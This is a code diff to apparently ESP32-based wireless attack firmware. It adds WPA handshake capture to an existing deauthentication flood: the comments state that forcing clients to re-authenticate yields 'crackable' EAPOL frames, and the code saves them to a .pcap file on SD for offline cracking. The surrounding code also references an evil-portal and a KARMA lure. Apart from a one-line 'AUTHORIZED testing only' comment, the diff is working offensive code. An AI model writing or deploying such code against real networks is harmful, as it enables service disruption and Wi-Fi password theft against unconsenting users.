@@ -42,6 +42,7 @@
 #include "freertos/task.h"
 #include "nucleo_exclusive.h"   // NX_NET_APP reclaim (~70KB); symbols resolve at link like the externs below
 #include "nucleo_wifiatk_probe.h"   // pure probe-request SSID parser (KARMA lure)
+#include "nucleo_wifiatk_eapol.h"   // pure WPA 4-way-handshake classifier (handshake capture)
 
 // Restore the saved network on stop (resolved at final link — same no-cycle arrangement the Evil
 // Portal uses: a hard REQUIRES on nucleo_setup would cycle, and we only need this one symbol).
@@ -176,6 +177,63 @@ static void add_station(const uint8_t *bssid, const uint8_t *mac)
     taskEXIT_CRITICAL(&s_mux);
 }
 
+// ---- WPA 4-way-handshake capture --------------------------------------------
+// Paired with the deauth flood: kicking clients forces them to re-authenticate, and the resulting
+// EAPOL-Key frames are the crackable material. We lock onto ONE AP (the first whose handshake we
+// hear), copy up to one frame per message (M1..M4) into a small heap buffer from the RX callback
+// (tiny crit-section, no SD there), and write a standard .pcap to SD on stop (UI task). DLT 105 =
+// IEEE 802.11. AUTHORIZED testing only. EAPOL classification is the host-tested wifiatk_eapol_msg.
+#define HS_FRAME_MAX 256
+typedef struct { uint8_t buf[HS_FRAME_MAX]; uint16_t len; uint8_t msg; } hs_frame_t;
+static hs_frame_t   *s_hs;                 // heap, allocated at deauth_start (not resident .bss)
+static volatile int  s_hs_n;
+static volatile uint8_t s_hs_mask;         // bit m set once message m (1..4) is captured
+static uint8_t       s_hs_bssid[6];        // the AP we locked onto
+static char          s_hs_path[64];        // .pcap written on stop ("" if none)
+
+static void hs_add(const uint8_t *bssid, const uint8_t *frame, int len, int msg)
+{
+    if (!s_hs || len <= 0 || len > HS_FRAME_MAX) return;
+    taskENTER_CRITICAL(&s_mux);
+    if (s_hs_n == 0) memcpy(s_hs_bssid, bssid, 6);           // lock onto the first AP we hear
+    if (mac_eq(bssid, s_hs_bssid) && s_hs_n < 4 && !(s_hs_mask & (1u << msg))) {
+        memcpy(s_hs[s_hs_n].buf, frame, len);
+        s_hs[s_hs_n].len = (uint16_t)len; s_hs[s_hs_n].msg = (uint8_t)msg;
+        s_hs_n++; s_hs_mask |= (uint8_t)(1u << msg);
+    }
+    taskEXIT_CRITICAL(&s_mux);
+}
+
+// A crackable handshake = messages 1+2 or 3+4 of the same AP.
+static bool hs_usable(void) { return (s_hs_mask & 0x06) == 0x06 || (s_hs_mask & 0x18) == 0x18; }
+
+// Write the captured frames to /sd/handshakes/<bssid>.pcap (UI task only). Best-effort.
+static void hs_write_pcap(void)
+{
+    s_hs_path[0] = 0;
+    if (!s_hs || s_hs_n == 0) return;
+    mkdir("/sd/handshakes", 0775);
+    const uint8_t *b = s_hs_bssid;
+    snprintf(s_hs_path, sizeof s_hs_path, "/sd/handshakes/hs_%02X%02X%02X%02X%02X%02X.pcap",
+             b[0], b[1], b[2], b[3], b[4], b[5]);
+    FILE *f = fopen(s_hs_path, "wb");
+    if (!f) { s_hs_path[0] = 0; return; }
+    uint32_t gh[] = { 0xA1B2C3D4u, 0, 0, 0, 65535u, 105u };          // PCAP global header, DLT 105
+    uint16_t ver[] = { 2, 4 };
+    fwrite(&gh[0], 4, 1, f); fwrite(ver, 2, 2, f);
+    fwrite(&gh[1], 4, 4, f);                                          // zone,sig,snaplen,network
+    for (int i = 0; i < s_hs_n; i++) {
+        uint32_t rh[] = { (uint32_t)i, 0, s_hs[i].len, s_hs[i].len };  // ts_sec,ts_usec,incl,orig
+        fwrite(rh, 4, 4, f);
+        fwrite(s_hs[i].buf, 1, s_hs[i].len, f);
+    }
+    fclose(f);
+}
+
+int         nucleo_wifiatk_handshake_msgmask(void) { return s_hs ? s_hs_mask : 0; }
+bool        nucleo_wifiatk_handshake_ready(void)   { return s_hs && hs_usable(); }
+const char *nucleo_wifiatk_handshake_path(void)    { return s_hs_path; }
+
 // Parse one sniffed frame; if it belongs to a target AP, learn the station MAC.
 static void promisc_cb(void *buf, wifi_promiscuous_pkt_type_t type)
 {
@@ -195,6 +253,10 @@ static void promisc_cb(void *buf, wifi_promiscuous_pkt_type_t type)
     if (ti < 0) return;
     s_targets[ti].rssi = pkt->rx_ctrl.rssi;               // live signal of this AP (proximity feedback)
     if (sta) add_station(bssid, sta);
+    if (type == WIFI_PKT_DATA) {                          // grab the WPA handshake the deauth shakes loose
+        int m = wifiatk_eapol_msg(p, len);
+        if (m) hs_add(bssid, p, len, m);
+    }
 }
 
 // ---- AP scan ----------------------------------------------------------------
@@ -532,6 +594,9 @@ esp_err_t nucleo_wifiatk_deauth_start(int target_idx)
     s_cur_ch = 0; s_cur_rssi = 0;
     s_cur_ssid[0] = 0;
     s_start_us = esp_timer_get_time();
+    // Handshake capture buffer (heap, not resident .bss). Failure just disables capture, not the flood.
+    s_hs_n = 0; s_hs_mask = 0; s_hs_path[0] = 0;
+    if (!s_hs) s_hs = malloc(sizeof(hs_frame_t) * 4);
 
     // We OWN the radio here (raw injection) — exclusive never touches Wi-Fi (no NX_WIFI), so we still
     // suspend STA auto-reconnect ourselves. NX_NET_APP also frees voice + ANIMA L1 (~24KB) the old
@@ -578,6 +643,8 @@ void nucleo_wifiatk_deauth_stop(void)
 
     esp_wifi_set_promiscuous(false);
     esp_wifi_set_promiscuous_rx_cb(NULL);
+    hs_write_pcap();                     // dump any captured handshake to SD (UI task -> big stack)
+    free(s_hs); s_hs = NULL;             // task is gone (waited above); RX cb won't touch it now
     nucleo_setup_apply_network();        // restore STA/AP from the saved config (network up first)
     nucleo_exclusive_exit();             // restart httpd + mDNS + voice; ANIMA L1 reloads lazily
     ESP_LOGI(TAG, "Deauth flood disarmed; network + OS web UI restored");
